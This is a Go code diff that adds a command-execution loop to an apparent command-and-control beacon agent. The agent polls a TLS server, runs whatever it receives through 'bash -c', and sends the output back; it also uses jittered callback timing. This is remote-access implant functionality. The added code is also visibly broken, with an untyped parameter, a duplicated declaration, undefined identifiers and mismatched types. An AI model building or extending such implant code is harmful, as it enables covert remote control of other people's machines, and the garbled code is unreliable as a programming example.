@@ -36,6 +36,8 @@ func main() {
 
 	agentID, hostname, username := generateAgentMetadata()
 
+	logger.Logf(logger.Info, "Created AgentID: %v. Hostname: %v. Username: %v", agentID, hostname, username)
+
 	for {
 		beacon, err := establishConnection(config)
 		if err != nil {
@@ -45,7 +47,7 @@ func main() {
 		logger.Logf(logger.Info, "Beacon connected")
 
 		ip := getLocalIP(beacon)
-		err = sendConfigurationRequest(beacon, agentID, hostname, username, ip)
+		err = handleConfigurationRequest(beacon, agentID, hostname, username, ip)
 		if err != nil {
 			logger.Logf(logger.Error, "Error sending configuration request: %v", err)
 			beacon.Close()
@@ -111,7 +113,7 @@ func getLocalIP(beacon *tls.Conn) string {
 	return fmt.Sprintf("%v", ipAddress)
 }
 
-func sendConfigurationRequest(beacon *tls.Conn, agentID, hostname, username, ip string) error {
+func handleConfigurationRequest(beacon *tls.Conn, agentID, hostname, username, ip string) error {
     configReq := types.ConfigurationRequest{
         AgentID:           agentID,
         Username:          username,
@@ -172,12 +174,108 @@ func updateClientConfig(config types.ConfigurationResponse) {
     }
 }
 
+func handleCommandRequest(beacon *tls.Conn, agentID) err {
+	logger.Logf(logger.Info, "Fetching commands to run")
+	out:
+	for {
+		commandReq := types.CommandRequest{
+			AgentID: agentID,
+		}
+
+		request := types.Request{
+			Type:		types.CommandRequestType,
+			Payload:	commandReq,
+		}
+
+		encoder := gob.NewEncoder(beacon)
+		encoder := gob.NewEncoder(beacon)
+		if err := encoder.Encode(request); err != nil {
+			return err
+		}
+
+		var response types.Response
+		decoder := gob.NewDecoder(beacon)
+		if err := decoder.Decode(&response); err != nil {
+			return err
+		}
+
+		if response.Type == types.CommandResponseType {
+			commandResponse, ok := response.Payload.(types.CommandResponse)
+			if !ok {
+				return fmt.Errorf("unexpected payload type")
+			}
+
+			// Run the command
+			commandResult := executeCommand(commandResponse)
+
+			// Send the command output to server
+			statusRequest := types.Request{
+				Type:		types.CommandStatusRequest,
+				Payload:	commandResult,
+			}
+			if err := encoder.Encode(statusRequest); err != nil {
+				return err
+			}
+
+			// The server is going to try and some response, we don't need it though.
+			if err := decoder.Decode(&response); err != nil {
+				return err
+			}
+
+			// Keep running until all commands are ran
+			if commandResult.CommandResult == 2 {
+				break out
+			}
+		} else {
+			return fmt.Errorf("unexpected response type: %v", response.Type)
+		}
+	}
+    return nil
+}
+
+func executeCommand(instruct *types.CommandResponse) types.CommandStatusRequest {
+    var result string
+	var CmdOut string
+	Logger.Logf(logger.Info, "Running command: %v", instruct.Command)
+	switch instruct.CommandType {
+	case "shell":
+		CmdOut = runShellCommand(instruct.Command)
+        result = "1"
+	case "kill":
+		CmdOut = "~Killed~"
+        result = "1"
+	default:
+		CmdOut = ""
+        result = "2"
+	}
+	return types.CommandStatusRequest{
+		AgentID:		CommandResponse.AgentID,
+		CommandID:		CommandResponse.CommandID,
+		Result:			result,
+		Output:			CmdOut,
+	}
+}
+
+func runShellCommand(command string) string {
+	if command == "" {
+		return ""
+	}
+	cmd := exec.Command("bash", "-c", command)
+	output, err := cmd.CombinedOutput()
+	if err != nil {
+		logger.Logf(logger.Error, "Error running command: %v", command)
+		return err.Error()
+	}
+	logger.Logf(logger.Done, "Ran command: %v", command)
+	return string(output)
+}
+
 func calculateSleepInterval() float64 {
-	frequency, _ := strconv.Atoi(CallbackFrequency)
-	jitter, _ := strconv.Atoi(CallbackJitter)
-	jitterPercent := float64(jitter) * 0.01
-	baseTime := float64(frequency)
 	rand.Seed(time.Now().UnixNano())
-	variance := baseTime * jitterPercent * rand.Float64()
+	frequency, _	:= strconv.Atoi(CallbackFrequency)
+	jitter, _		:= strconv.Atoi(CallbackJitter)
+	jitterPercent	:= float64(jitter) * 0.01
+	baseTime		:= float64(frequency)
+	variance		:= baseTime * jitterPercent * rand.Float64()
 	return baseTime - (jitterPercent * baseTime) + 2*variance
 }
